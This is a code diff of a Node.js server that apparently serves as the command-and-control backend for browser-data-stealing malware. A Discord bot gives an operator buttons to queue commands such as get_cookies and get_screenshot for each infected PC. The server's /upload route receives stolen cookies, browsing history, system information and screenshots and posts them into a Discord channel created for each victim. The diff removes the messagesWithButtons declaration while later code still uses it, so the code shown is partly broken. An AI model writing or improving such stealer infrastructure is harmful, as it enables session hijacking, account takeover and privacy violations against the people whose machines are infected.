@@ -15,7 +15,7 @@ const CATEGORY_NAME = "Все ПК";
 const ONLINE_TIMEOUT = 3 * 60 * 1000; // 3 минуты
 const onlinePCs = {};          // { pcId: lastPingTimestamp }
 const pendingCommands = {};    // { pcId: [ 'get_cookies', ... ] }
-const messagesWithButtons = {}; // { pcId: messageId }
+const channelByPC = {};        // { pcId: channelId }
 
 // ---------------- Discord Bot ----------------
 const bot = new Client({ intents: [GatewayIntentBits.Guilds] });
@@ -40,12 +40,12 @@ bot.on("interactionCreate", async interaction => {
 
   const [command, ...pcIdParts] = interaction.customId.split("|");
   const pcId = pcIdParts.join("|");
+  const lastPing = onlinePCs[pcId];
 
-  // ---------------- Check Online ----------------
+  // Проверяем реальное состояние ПК
+  const isOnline = lastPing && (Date.now() - lastPing < ONLINE_TIMEOUT);
+
   if(command === "check_online") {
-    const lastPing = onlinePCs[pcId];
-    const isOnline = lastPing && (Date.now() - lastPing < ONLINE_TIMEOUT);
-
     await interaction.reply({
       content: isOnline
         ? `✅ ПК ${pcId} онлайн`
@@ -55,15 +55,15 @@ bot.on("interactionCreate", async interaction => {
     return;
   }
 
-  // ---------------- Other Commands ----------------
-  const lastPing = onlinePCs[pcId];
-  if (!lastPing || (Date.now() - lastPing > ONLINE_TIMEOUT)) {
+  // Не отправлять команды, если ПК оффлайн
+  if(!isOnline){
     await interaction.reply({ content: `❌ ПК ${pcId} оффлайн`, ephemeral: true });
     return;
   }
 
-  if (!pendingCommands[pcId]) pendingCommands[pcId] = [];
+  if(!pendingCommands[pcId]) pendingCommands[pcId] = [];
   pendingCommands[pcId].push(command);
+
   await interaction.reply({ content: `✅ Команда "${command}" отправлена ПК ${pcId}`, ephemeral: true });
 });
 
@@ -71,52 +71,54 @@ bot.on("interactionCreate", async interaction => {
 async function getOrCreateCategory(guild, name) {
   const channels = await guild.channels.fetch();
   let category = channels.find(c => c.type === ChannelType.GuildCategory && c.name === name);
-  if (!category) category = await guild.channels.create({ name, type: ChannelType.GuildCategory });
+  if(!category) category = await guild.channels.create({ name, type: ChannelType.GuildCategory });
   return category;
 }
 
 async function getOrCreateTextChannel(guild, name, parentId) {
   const channels = await guild.channels.fetch();
   let channel = channels.find(c => c.type === ChannelType.GuildText && c.name === name && c.parentId === parentId);
-  if (!channel) channel = await guild.channels.create({ name, type: ChannelType.GuildText, parent: parentId });
+  if(!channel) channel = await guild.channels.create({ name, type: ChannelType.GuildText, parent: parentId });
   return channel;
 }
 
 // ---------------- Server Routes ----------------
 
 // Receive data from PC
-app.post("/upload", async (req, res) => {
-  try {
-    const { pcId, cookies, history, systemInfo, tabs, extensions, screenshot } = req.body;
+app.post("/upload", async (req,res)=>{
+  try{
+    const { pcId, cookies, history, systemInfo, tabs, extensions, screenshot, command } = req.body;
     if(!pcId) return res.status(400).json({ error:"pcId required" });
 
     onlinePCs[pcId] = Date.now();
 
     const guild = await bot.guilds.fetch(GUILD_ID);
     const category = await getOrCreateCategory(guild, CATEGORY_NAME);
-    const channel = await getOrCreateTextChannel(guild, pcId, category.id);
+    const channel = channelByPC[pcId]
+      ? await guild.channels.fetch(channelByPC[pcId])
+      : await getOrCreateTextChannel(guild, pcId, category.id);
 
+    channelByPC[pcId] = channel.id; // сохраняем канал
+
+    // Отправка только нужных данных по команде
     const files = [];
-    if(cookies) files.push({ attachment: Buffer.from(JSON.stringify(cookies, null, 2)), name: `${pcId}-cookies.json` });
-    if(history) files.push({ attachment: Buffer.from(JSON.stringify(history, null, 2)), name: `${pcId}-history.json` });
-    if(systemInfo) files.push({ attachment: Buffer.from(JSON.stringify(systemInfo, null, 2)), name: `${pcId}-system.json` });
-    if(tabs) files.push({ attachment: Buffer.from(JSON.stringify(tabs, null, 2)), name: `${pcId}-tabs.json` });
-    if(extensions) files.push({ attachment: Buffer.from(JSON.stringify(extensions, null, 2)), name: `${pcId}-extensions.json` });
-    if(screenshot) files.push({ attachment: Buffer.from(screenshot, "base64"), name: `${pcId}-screenshot.jpeg` });
+    if(command === 'get_cookies' && cookies) files.push({ attachment: Buffer.from(JSON.stringify(cookies, null, 2)), name: `${pcId}-cookies.json` });
+    if(command === 'get_history' && history) files.push({ attachment: Buffer.from(JSON.stringify(history, null, 2)), name: `${pcId}-history.json` });
+    if(command === 'get_system' && systemInfo) files.push({ attachment: Buffer.from(JSON.stringify(systemInfo, null, 2)), name: `${pcId}-system.json` });
+    if(command === 'get_screenshot' && screenshot) files.push({ attachment: Buffer.from(screenshot, "base64"), name: `${pcId}-screenshot.jpeg` });
 
-    if(files.length){
-        try { await channel.send({ files }); } catch(e){ console.error("Ошибка отправки файлов:", e); }
-    }
+    if(files.length) await channel.send({ files });
 
+    // Создаём кнопки один раз
     if(!messagesWithButtons[pcId]){
-        const message = await channel.send({ content: `Управление ПК ${pcId}`, components: createControlButtons(pcId) });
-        messagesWithButtons[pcId] = message.id;
+      const msg = await channel.send({ content: `Управление ПК ${pcId}`, components: createControlButtons(pcId) });
+      messagesWithButtons[pcId] = msg.id;
     }
 
-    res.json({ success: true });
-  } catch(err){
+    res.json({ success:true });
+  }catch(err){
     console.error(err);
-    res.status(500).json({ error: err.message });
+    res.status(500).json({ error:err.message });
   }
 });
 
@@ -126,6 +128,7 @@ app.post("/ping", (req,res)=>{
   if(!pcId) return res.status(400).json({ error:"pcId required" });
 
   onlinePCs[pcId] = Date.now();
+
   const commands = pendingCommands[pcId] || [];
   pendingCommands[pcId] = [];
   res.json({ commands });
